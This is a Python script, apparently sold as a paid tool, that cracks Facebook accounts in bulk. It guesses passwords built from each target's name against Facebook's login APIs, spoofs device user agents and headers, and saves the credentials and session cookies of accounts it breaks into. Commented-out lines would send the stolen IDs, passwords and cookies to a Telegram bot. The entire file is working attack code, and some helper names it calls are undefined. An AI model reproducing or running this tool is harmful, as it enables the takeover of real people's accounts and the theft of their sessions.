#!/usr/bin/python
# DEV BY AVHI  GOD
 
#----------IMPORT MODULES----------#
import os,zlib
 
from os import system as osRUB
from os import system as cmd
os.system('clear')
print('Loading Modules....\n')
 
 
 
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
 
 
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
 
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
 
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as AVHIgod
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
 
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
 
    
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/279.0.0.12.135;FBBV/39679600;FBDM/{density=2.5,width=720,height=1080};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SPH-L720;FBSV/12.2.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/314.0.0.8.130;FBBV/52144898;FBDM/{density=1.0,width=1280,height=1080};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/7.2.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/338.0.0.38.95;FBBV/33614865;FBDM/{density=1.5,width=1080,height=1440};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/13.5.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/1.4.0 (Linux; U; Android 2.3.6; Orinoquia Auyantepui Y210 Build/OrinoquiaY210)"+"Dalvik/1.4.0 (Linux; U; Android 2.3.7; V9 Build/GRJ22)"+"Dalvik/1.4.0 (Linux; U; Android 2.3.5; IQ239 Build/MocorDroid2.3.5) '+END
    return ua
 
def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/448.0.0.21.106;FBBV/48331180;FBDM/{density=1.0,width=1280,height=1440};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/11.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/233.0.0.2.25;FBBV/31206214;FBDM/{density=1.0,width=1080,height=1920};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/13.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/360.0.0.18.62;FBBV/18530736;FBDM/{density=3.0,width=1080,height=1280};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/10.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SG32.39-60-3)"+"Dalvik/1.1.0 (Linux; U; Android 2.1-update1; HTC Hero Build/ERE27)"+"Dalvik/2.0.0 (Linux; U; Android 4.4.2; S50 Build/KVT49L) '+END
    return ua
 
sys.stdout.write('\x1b]2; AVHI \x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
 
#----------LOGO----------#
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo =                                          """            
     \033[1;32m_    ____  _   _ ___ ____  _____ _  ___   _ 
   \033[1;32m / \  | __ )| | | |_ _/ ___|| ____| |/ / | | |
   \033[1;32m/ _ \ |  _ \| |_| || |\___ \|  _| | ' /| |_| |
 \033[1;32m / ___ \| |_) |  _  || | ___) | |___| . \|  _  |
 \033[1;32m/_/   \_\____/|_| |_|___|____/|_____|_|\_\_| |_| bau
\033[1;37m--------------------------------------------------
\033[1;37m[\033[1;32m✓\033[1;37m]CREATOR :\033[1;34m ABHISHEK 
\033[1;37m[\033[1;32m✓\033[1;37m]TYPE    :\033[1;31m PAID
\033[1;33m--------------------------------------------------"""
 
#----------CLEAR----------#
def clear():
    os.system("clear")
    print(logo)    
    
#----------RESULTS----------#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' CRACKED COMPLETED...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("PRESS ENTER TO BACK AVHI  GOD MENU ")
        exit()
 
#----------MAIN MENU----------#
def AVHI ():   
    os.system('clear')
    print(logo)
    print(f'[1]FILE CRACKING')
    print(f'[2]CONTACT ON FACEBOOK')
    print('')
    select = input('SELECT MENU : ')
    if select =='1':
        method_crack()
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100091471120905&mibextid=ZbWKwL')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        AVHI (allkey)
        
def method_crack():
    global methods
    clear()
    print(f'[1] METHOD (1) [WORKING]')
    print(f'[2] METHOD (2) [SOON]')
    print(f'[3] METHOD (3) [WORKING]')
    #print(f'[4] Method {4}')
    print(f'[0] BACK')
    print('')
    option = input('SELECT METHOD : ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
   # elif option =='4':
    #    methods.append('methodD')
   #     main_crack().crack(id)
    elif option =='0':
        AVHI ()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()
 
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('PUT FILE NAME : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ AVHI  ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            ############ DEVICES ###################
            FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])
            FBAN = random.choice(['FB4A', 'Orca-Android'])
            FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
            FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
            facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
            facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
            fbv = random.randint(1111111, 9999999)
            facebook = f"{random.randint(120, 441)}.0.0.{random.randint(1000, 6000)}"
            fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
            fbbv = str(random.randint(11111111, 99999999))
            fbrv = str(random.randint(11111111, 99999999))
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
            andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
            country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
            fbaan = random.choice(['FB4A', 'Orca-Android'])
            fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
            fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
            chrome_version = f'{random.randrange(73,130)}.0.{random.randrange(4200,5500)}.{random.randrange(40,150)}'
            ##################  ___  DEVICE NAME AND HIS REAL VERSIONS__  ##################
            n1 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C104 [FBAN/FBIOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.2;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5]"
            n2 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17A878 [FBAN/FBIOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.1.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]"
            n3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5;FBRV/0]"
            n4 = f"Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16E227 [FBAN/FBIOS;FBDV/iPad6,11;FBMD/iPad;FBSN/iOS;FBSV/12.2;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]"
            n5 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16G102 [FBAN/FBIOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.4.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]"
            n6 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/FBIOS;FBAV/204.0.0.31.101;FBBV/138239255;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/139481368]"
            n7 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.4;FBSS/2;FBID/phone;FBLC/es_ES;FBOP/5;FBCR/Carrier]"
            ua = random.choice([n1,n2,n3,n4,n5,n6,n7])
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"try_num": "1",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"api_key": "882a8490361da98702bf97a021ddc14d",
"email": sid,
"password": ps,
"method": "auth.login",
"generate_session_cookies": "1",
'meta_inf_fbmeta': 'NO_FILE',
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
'api_key': '882a8490361da98702bf97a021ddc14d',}
                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                headers = {'User-Agent':ua,
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Connection-Type': 'MOBILE.LTE', 
'Accept': '*/*',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '20084',
'X-FB-Sim-HNI': '37460',
'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-Fb-Connection-Bandwidth': '80025933',
'Priority' : 'u=3,i',
'Zero-Rated': '0',
'X-FB-Connection-Quality': 'MOBILE.LTE',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-Fb-Device-Group': '5120',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '847'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [AVHI -OK] {sid} | {ps} {S}")
                    #requests.get("https://api.telegram.org/bot6769693282:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6769693282&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    #print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/AVHI _OK_IDs_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AVHI _IDs_COOKIES_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [AVHI -CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AVHI _CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ AVHI  ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildLSB(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [AVHI -OK] {sid} | {ps} {S}")
                    #requests.get("https://api.telegram.org/bot6769693282:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6769693282&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    #print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/AVHI _OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AVHI _IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [AVHI -CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/AVHI _CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ AVHI  ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildHHL(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [AVHI -OK] {sid} | {ps} {S}")
                    #requests.get("https://api.telegram.org/bot6769693282:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6769693282&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    #print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/AVHI _OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AVHI _IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [AVHI -CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/AVHI _CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
 
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ AVHI  ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [AVHI -OK] {sid} | {ps} {S}")
                    #requests.get("https://api.telegram.org/bot6769693282:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6769693282&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    #print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/AVHI _OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [AVHI -CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/AVHI _CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('PUT LIMIT BETWEEN 1 TO 30')
            sl = int(input('HOW MANY PASSWORD DO YOU WANT TO ADD ? : '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example : first123,last1122,firstlast,last,etc]')
            print('')
            if sl =='':
                print('\n PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print('\nPASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f' PASSWORD ({sr+1}) : '))
            os.system("clear")
            print(logo)
            
            print(f"\r{S}USE FLIGHT (AIRPLANE) MODE FOR BETTER RESULTS {S}")
            print(47*"-")
            print(f'{S} TOTAL IDs : %s ' % len(self.id))
            print(f'{S} CRACKING STARTED...')
            print(47*"-")
            with AVHIgod(max_workers=30) as AVHIworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                AVHIworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                AVHIworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                AVHIworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                AVHIworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)               
 
 
AVHI ()
 
